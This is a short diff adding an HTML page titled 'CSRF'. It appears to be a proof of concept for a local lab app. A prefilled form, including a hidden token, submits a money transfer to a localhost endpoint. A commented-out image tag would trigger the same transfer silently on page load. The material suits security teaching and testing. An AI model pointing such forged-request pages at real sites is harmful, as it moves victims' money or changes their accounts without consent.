@@ -1,0 +1,26 @@
+<html>
+
+<head>
+    <title> CSRF </title>
+</head>
+
+<body>
+
+    <form action="http://localhost:8080/JotPot/csrf_money_transfer.php" method="GET">
+
+        <p><label for="account">Account to transfer:</label><br>
+            <input type="text" id="account" name="account" value="123-45678-90"></p>
+
+        <p><label for="amount">Amount to transfer:</label><br>
+            <input type="text" id="amount" name="amount" value="100"></p>
+        <input type="hidden" id="token" name="token" value="bc963c1b8e5b56a5d9e7e14ef29ed8b80e48de9a">
+
+        <button type="submit" name="action" value="transfer">Transfer</button>
+    </form>
+
+    <!--<img src="http://localhost:8080/JotPot/csrf_money_transfer.php?account=123-45678-90&amount=100&action=transfer">-->
+
+
+</body>
+
+</html>
